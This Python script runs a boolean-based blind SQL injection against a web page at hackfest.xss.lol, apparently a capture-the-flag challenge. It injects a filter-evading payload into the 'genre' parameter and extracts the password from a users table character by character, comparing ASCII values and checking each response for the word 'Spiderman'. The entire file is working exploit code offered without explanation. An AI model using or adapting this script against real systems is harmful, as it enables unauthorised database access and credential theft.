import requests

## Based on the following query
## http://hackfest.xss.lol/index.php?genre=x%27%20or%201.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e,1%201.e)%201.e,1%201.e,1%201.e)1.e)1.e)%20=%2070%20or%271%27=%272


def test_query(session, query, offset_row, offset_substring, ascii_value):

    paramsGet = {"genre":"xx' or 1.e(ascii 1.e(substring(1.e("+query+" limit "+str(offset_row)+" 1.e,1 1.e) 1.e,"+str(offset_substring)+" 1.e,1 1.e)1.e)1.e) = "+str(ascii_value)+" or'1'='2"}
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","Cache-Control":"no-cache","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1","Pragma":"no-cache"}
    response = session.get("http://hackfest.xss.lol/index.php", params=paramsGet, headers=headers)

    return "Spiderman" in response.text # The firt entry is return the movie Spiderman.. It could be any other value.



session = requests.Session()

query = "select password from users"

row_index = 0 # row 0, 1, ...
current_index = 1 #Sting offset

string_extracted = ""

condition_true = True


while(condition_true):

    condition_true = False

    for ascii_val in range(32,128):
        condition_true = test_query(session,query,row_index,current_index,ascii_val)
        
        if(condition_true):
            string_extracted += chr(ascii_val)
            print("Found {} {}".format(ascii_val,chr(ascii_val)))
            print("String extracted {}".format(string_extracted))

            current_index +=1
            break
    

